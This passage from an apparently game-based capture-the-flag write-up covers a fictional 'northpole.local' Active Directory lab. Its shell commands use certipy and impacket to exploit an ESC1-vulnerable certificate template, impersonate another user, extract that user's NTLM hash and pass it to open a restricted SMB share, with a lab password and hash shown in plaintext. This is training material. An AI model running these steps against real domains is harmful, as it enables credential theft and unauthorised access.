        "RestrictedKrbHost/npdc01.northpole.local",
        "RestrictedKrbHost/npdc01",
        "RPC/7d6a9aed-cb59-4c4e-9cad-996309493b53._msdcs.northpole.local",
        "HOST/npdc01/NORTHPOLE",
        "HOST/npdc01.northpole.local/NORTHPOLE",
        "HOST/npdc01",
        "HOST/npdc01.northpole.local",
        "HOST/npdc01.northpole.local/northpole.local",
        "E3514235-4B06-11D1-AB04-00C04FC2DCD2/7d6a9aed-cb59-4c4e-9cad-996309493b53/northpole.local",
        "ldap/npdc01/NORTHPOLE",
        "ldap/7d6a9aed-cb59-4c4e-9cad-996309493b53._msdcs.northpole.local",
        "ldap/npdc01.northpole.local/NORTHPOLE",
        "ldap/npdc01",
        "ldap/npdc01.northpole.local",
        "ldap/npdc01.northpole.local/northpole.local"
      ],
      "uSNChanged": [
        12927
      ],
      "uSNCreated": [
        12293
      ],
      "userAccountControl": [
        532480
      ],
      "userCertificate": [
        {
          "encoded": "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",
          "encoding": "base64"
        }
      ],
      "whenChanged": [
        "2024-01-04 01:17:43+00:00"
      ],
      "whenCreated": [
        "2024-01-04 01:11:32+00:00"
      ]
    },
    "dn": "CN=npdc01,OU=Domain Controllers,DC=northpole,DC=local"
  }
]
```

Using `smbclient` we can authenticate to the DC and try to access the secret folder and file.

```shell
alabaster@ssh-server-vm:/tmp$ smbclient.py northpole.local/elfy@10.0.0.53 -dc-ip 10.0.0.53
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
Type help for list of commands
# shares
ADMIN$
C$
D$
FileShare
IPC$
NETLOGON
SYSVOL
# use FileShare
# ls
drw-rw-rw-          0  Thu Jan  4 01:14:53 2024 .
drw-rw-rw-          0  Thu Jan  4 01:14:50 2024 ..
-rw-rw-rw-     701028  Thu Jan  4 01:14:53 2024 Cookies.pdf
-rw-rw-rw-    1521650  Thu Jan  4 01:14:53 2024 Cookies_Recipe.pdf
-rw-rw-rw-      54096  Thu Jan  4 01:14:53 2024 SignatureCookies.pdf
drw-rw-rw-          0  Thu Jan  4 01:14:53 2024 super_secret_research
-rw-rw-rw-        165  Thu Jan  4 01:14:53 2024 todo.txt
# cd super_secret_research
[-] SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)
```

We can have the idea that we might have to escalate privileges to the another user.

The `domain_users.*` files contain information about the users in the domain. There is a `wombleycube` user who is in the `researchers` group, he is our target.

```shell
alabaster@ssh-server-vm:/tmp$ cat domain_users.json | jq .[0]
{
  "attributes": {
    "accountExpires": [
      "9999-12-31 23:59:59.999999+00:00"
    ],
    "badPasswordTime": [
      "2024-01-04 08:40:38.530857+00:00"
    ],
    "badPwdCount": [
      0
    ],
    "cn": [
      "wombleycube"
    ],
    "codePage": [
      0
    ],
    "countryCode": [
      0
    ],
    "dSCorePropagationData": [
      "2024-01-04 01:13:58+00:00",
      "1601-01-01 00:00:00+00:00"
    ],
    "distinguishedName": [
      "CN=wombleycube,CN=Users,DC=northpole,DC=local"
    ],
    "givenName": [
      "wombleycube"
    ],
    "instanceType": [
      4
    ],
    "lastLogoff": [
      "1601-01-01 00:00:00+00:00"
    ],
    "lastLogon": [
      "2024-01-04 18:00:56.152494+00:00"
    ],
    "lastLogonTimestamp": [
      "2024-01-04 01:24:21.274748+00:00"
    ],
    "logonCount": [
      181
    ],
    "memberOf": [
      "CN=researchers,CN=Users,DC=northpole,DC=local"
    ],
    "name": [
      "wombleycube"
    ],
    "objectCategory": [
      "CN=Person,CN=Schema,CN=Configuration,DC=northpole,DC=local"
    ],
    "objectClass": [
      "top",
      "person",
      "organizationalPerson",
      "user"
    ],
    "objectGUID": [
      "{410009c8-8f10-4a51-90ed-5d1d99f88711}"
    ],
    "objectSid": [
      "S-1-5-21-4226926071-136753372-792344341-1105"
    ],
    "primaryGroupID": [
      513
    ],
    "pwdLastSet": [
      "2024-01-04 01:13:58.725203+00:00"
    ],
    "sAMAccountName": [
      "wombleycube"
    ],
    "sAMAccountType": [
      805306368
    ],
    "uSNChanged": [
      12937
    ],
    "uSNCreated": [
      12768
    ],
    "userAccountControl": [
      66048
    ],
    "userPrincipalName": [
      "wombleycube@northpole.local"
    ],
    "whenChanged": [
      "2024-01-04 01:24:21+00:00"
    ],
    "whenCreated": [
      "2024-01-04 01:13:58+00:00"
    ]
  },
  "dn": "CN=wombleycube,CN=Users,DC=northpole,DC=local"
}
```

We can use `certipy` to find vulnerable certificate templates using the previously obtained information.

```shell
alabaster@ssh-server-vm:/tmp$ certipy find -vulnerable -u elfy@northpole.local -p J4\`ufC49/J4766 -dc-ip 10.0.0.53
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'northpole-npdc01-CA' via CSRA
[!] Got error while trying to get CA configuration for 'northpole-npdc01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'northpole-npdc01-CA' via RRP
[*] Got CA configuration for 'northpole-npdc01-CA'
[*] Saved BloodHound data to '20231226212024_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
[*] Saved text output to '20231226212024_Certipy.txt'
[*] Saved JSON output to '20231226212024_Certipy.json'

alabaster@ssh-server-vm:/tmp$ cat 20231226212024_Certipy.json
{
  "Certificate Authorities": {
    "0": {
      "CA Name": "northpole-npdc01-CA",
      "DNS Name": "npdc01.northpole.local",
      "Certificate Subject": "CN=northpole-npdc01-CA, DC=northpole, DC=local",
      "Certificate Serial Number": "1A1C4055F96FB8B542EE4B1FDF81A248",
      "Certificate Validity Start": "2023-12-26 01:08:06+00:00",
      "Certificate Validity End": "2028-12-26 01:18:05+00:00",
      "Web Enrollment": "Disabled",
      "User Specified SAN": "Disabled",
      "Request Disposition": "Issue",
      "Enforce Encryption for Requests": "Enabled",
      "Permissions": {
        "Owner": "NORTHPOLE.LOCAL\\Administrators",
        "Access Rights": {
          "2": [
            "NORTHPOLE.LOCAL\\Administrators",
            "NORTHPOLE.LOCAL\\Domain Admins",
            "NORTHPOLE.LOCAL\\Enterprise Admins"
          ],
          "1": [
            "NORTHPOLE.LOCAL\\Administrators",
            "NORTHPOLE.LOCAL\\Domain Admins",
            "NORTHPOLE.LOCAL\\Enterprise Admins"
          ],
          "512": [
            "NORTHPOLE.LOCAL\\Authenticated Users"
          ]
        }
      }
    }
  },
  "Certificate Templates": {
    "0": {
      "Template Name": "NorthPoleUsers",
      "Display Name": "NorthPoleUsers",
      "Certificate Authorities": [
        "northpole-npdc01-CA"
      ],
      "Enabled": true,
      "Client Authentication": true,
      "Enrollment Agent": false,
      "Any Purpose": false,
      "Enrollee Supplies Subject": true,
      "Certificate Name Flag": [
        "EnrolleeSuppliesSubject"
      ],
      "Enrollment Flag": [
        "PublishToDs",
        "IncludeSymmetricAlgorithms"
      ],
      "Private Key Flag": [
        "ExportableKey"
      ],
      "Extended Key Usage": [
        "Encrypting File System",
        "Secure Email",
        "Client Authentication"
      ],
      "Requires Manager Approval": false,
      "Requires Key Archival": false,
      "Authorized Signatures Required": 0,
      "Validity Period": "1 year",
      "Renewal Period": "6 weeks",
      "Minimum RSA Key Length": 2048,
      "Permissions": {
        "Enrollment Permissions": {
          "Enrollment Rights": [
            "NORTHPOLE.LOCAL\\Domain Admins",
            "NORTHPOLE.LOCAL\\Domain Users",
            "NORTHPOLE.LOCAL\\Enterprise Admins"
          ]
        },
        "Object Control Permissions": {
          "Owner": "NORTHPOLE.LOCAL\\Enterprise Admins",
          "Write Owner Principals": [
            "NORTHPOLE.LOCAL\\Domain Admins",
            "NORTHPOLE.LOCAL\\Enterprise Admins"
          ],
          "Write Dacl Principals": [
            "NORTHPOLE.LOCAL\\Domain Admins",
            "NORTHPOLE.LOCAL\\Enterprise Admins"
          ],
          "Write Property Principals": [
            "NORTHPOLE.LOCAL\\Domain Admins",
            "NORTHPOLE.LOCAL\\Enterprise Admins"
          ]
        }
      },
      "[!] Vulnerabilities": {
        "ESC1": "'NORTHPOLE.LOCAL\\\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication"
      }
    }
  }
}
```

The `NorthPoleUsers` certificate template is vulnerable: `'NORTHPOLE.LOCAL\Domain Users' can enroll, enrollee supplies subject and template allows client authentication`.

Let's get a certificate for `wombleycube`.

```shell
alabaster@ssh-server-vm:/tmp$ certipy req -u elfy@northpole.local -p J4\`ufC49/J4766 -dc-ip 10.0.0.53 -ca 'northpole-npdc01-CA' -template 'NorthPoleUsers' -upn 'wombleycube@northpole.local'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 85
[*] Got certificate with UPN 'wombleycube@northpole.local'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'wombleycube.pfx'
```

We can use the obtained `pfx` to get the NTLM hash of the `wombleycube` user.

```shell
alabaster@ssh-server-vm:/tmp$ certipy auth -pfx 'wombleycube.pfx' -username 'wombleycube' -domain 'northpole.local' -dc-ip 10.0.0.53
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: wombleycube@northpole.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'wombleycube.ccache'
[*] Trying to retrieve NT hash for 'wombleycube'
[*] Got hash for 'wombleycube@northpole.local': aad3b435b51404eeaad3b435b51404ee:5740373231597863662f6d50484d3e23
```

Using the NTLM hash, we can authenticate to the SMB share and get the name of the secret file.

```shell
alabaster@ssh-server-vm:/tmp$ smbclient.py northpole.local/wombleycube@10.0.0.53 -hashes aad3b435b51404eeaad3b435b51404ee:5740373231597863662f6d50484d3e23 -dc-ip 10.0.0.53
# shares
ADMIN$
C$
D$
FileShare
IPC$
NETLOGON
SYSVOL
# use FileShare
# ls
drw-rw-rw-          0  Tue Dec 26 01:16:05 2023 .
drw-rw-rw-          0  Tue Dec 26 01:16:01 2023 ..
-rw-rw-rw-     701028  Tue Dec 26 01:16:05 2023 Cookies.pdf
-rw-rw-rw-    1521650  Tue Dec 26 01:16:05 2023 Cookies_Recipe.pdf
-rw-rw-rw-      54096  Tue Dec 26 01:16:05 2023 SignatureCookies.pdf
drw-rw-rw-          0  Tue Dec 26 01:16:05 2023 super_secret_research
-rw-rw-rw-        165  Tue Dec 26 01:16:05 2023 todo.txt
# cd super_secret_research
# ls
drw-rw-rw-          0  Tue Dec 26 01:16:05 2023 .
drw-rw-rw-          0  Tue Dec 26 01:16:05 2023 ..
-rw-rw-rw-        231  Tue Dec 26 01:16:05 2023 InstructionsForEnteringSatelliteGroundStation.txt

# cat InstructionsForEnteringSatelliteGroundStation.txt
Note to self:

To enter the Satellite Ground Station (SGS), say the following into the speaker:

And he whispered, 'Now I shall be out of sight;
So through the valley and over the height.'
And he'll silently take his way.
```

> **Ribb Bonbowford (Coggoggle Marina)**:
*Wow, nice work. I'm impressed!
This is all starting to feel like more than just a coincidence though. Everything Alabaster's been setting up lately with the help of ChatNPT contains all these vulnerabilities. It almost feels deliberate, if you ask me.
Now obviously an LLM AI like ChatNPT cannot have deliberate motivations itself. It's just a machine. But I wonder who could have built it and who is controlling it?
On top of that, we apparently have a satellite ground station on Geese Islands. I wonder where that thing would even be located.
Well, I guess it's probably somewhere on Space Island, but I've not been there yet.
I'm not a big fan of jungles, you see. I have this tendency to get lost in them.
Anyway, if you feel like investigating, that'd be where I'd go look.
Good luck and I'd try and steer clear of ChatNPT if I were you.*